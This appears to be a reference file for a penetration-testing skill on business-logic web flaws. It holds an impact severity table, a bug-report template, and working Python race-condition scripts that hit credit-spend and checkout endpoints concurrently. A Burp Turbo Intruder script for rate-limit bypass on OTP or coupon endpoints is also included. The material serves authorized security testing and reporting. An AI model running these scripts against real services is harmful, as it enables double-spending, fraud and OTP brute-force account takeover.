# Reference: web-vuln-business-logic

## Business Impact Classification Table

| Vulnerability | Concrete Impact | Severity |
|---------------|-----------------|----------|
| Price manipulation → $0 purchase | Direct revenue loss | Critical |
| Negative quantity → free credit | Financial fraud | Critical |
| TOCTOU double-spend | Integrity + financial loss | Critical |
| Workflow bypass → skip payment | Service without payment | Critical |
| Coupon replay → infinite discount | Financial abuse at scale | High |
| Feature flag abuse → premium free | Service integrity | High |
| Rate limit bypass → OTP brute force | Leads to ATO | High |
| Expired coupon still works | Limited financial impact | Medium |

## Report Format Template

```
Title: [Category] in [Endpoint] allows [actor] to [concrete impact]
Example: "Negative quantity in /api/cart allows authenticated user to obtain store credits for free"

Impact statement must quantify:
- Monetary loss per exploit (e.g., "attacker obtains $X of credit for free")
- Scale (e.g., "repeatable indefinitely with a single account")
- Prerequisites (e.g., "requires only a free account, no other preconditions")
```

---

## Python Race Condition Scripts (Step 7: TOCTOU Testing)

### Credit/Balance Double-Spend

```python
import threading
import requests
import os

target = os.environ.get("SECSKILL_TARGET", "")
token = os.environ.get("SECSKILL_TOKEN", "")
outdir = os.environ.get("SECSKILL_OUTPUT_DIR", "./output")

url = f"{target}/api/credits/spend"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
payload = {"amount": 10, "action": "purchase"}

results = []
lock = threading.Lock()

def spend():
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        with lock:
            results.append((r.status_code, r.text[:100]))
    except Exception as e:
        with lock:
            results.append((-1, str(e)))

# Launch 10 threads simultaneously
threads = [threading.Thread(target=spend) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [(s, b) for s, b in results if s == 200]
print(f"Results: {len(successes)}/10 requests succeeded (HTTP 200)")
if len(successes) > 1:
    print(f"[!] POTENTIAL TOCTOU — {len(successes)} concurrent spend requests all succeeded")
    for i, (status, body) in enumerate(successes):
        print(f"  Thread {i+1}: {status} | {body[:80]}")
else:
    print("[-] No double-spend detected (check if balance was decremented correctly)")

with open(f"{outdir}/toctou_results.txt", "w") as f:
    for status, body in results:
        f.write(f"{status}|{body}\n")
```

### Checkout Race Condition (Duplicate Order)

```python
import threading, requests, os

target = os.environ.get("SECSKILL_TARGET", "")
token = os.environ.get("SECSKILL_TOKEN", "")
url = f"{target}/api/checkout/confirm"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
payload = {"cart_id": os.environ.get("SECSKILL_ITEM_ID", "test-cart"), "payment_method": "card"}

results = []
lock = threading.Lock()

def confirm():
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        with lock:
            results.append((r.status_code, r.text[:100]))
    except Exception as e:
        with lock:
            results.append((-1, str(e)))

barrier = threading.Barrier(5)

def barrier_confirm():
    barrier.wait()  # all threads start at exactly the same moment
    confirm()

threads = [threading.Thread(target=barrier_confirm) for _ in range(5)]
for t in threads:
    t.start()
for t in threads:
    t.join()

orders = [(s, b) for s, b in results if s == 200]
print(f"Checkout race: {len(orders)}/5 confirmations accepted")
if len(orders) > 1:
    print(f"[!] POTENTIAL RACE — {len(orders)} orders created from one cart")
```

---

## Turbo Intruder Script (Step 5: Rate Limit Bypass via HTTP/2)

Run inside Burp Suite's Turbo Intruder extension for last-byte synchronized race testing:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=20,
                           pipeline=True)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Usage**: Paste into Turbo Intruder, set the target endpoint to the rate-limited resource (e.g., OTP send, coupon apply), and click Attack. All 20 requests are held until the gate opens, providing sub-millisecond synchronization that bash background jobs cannot match.
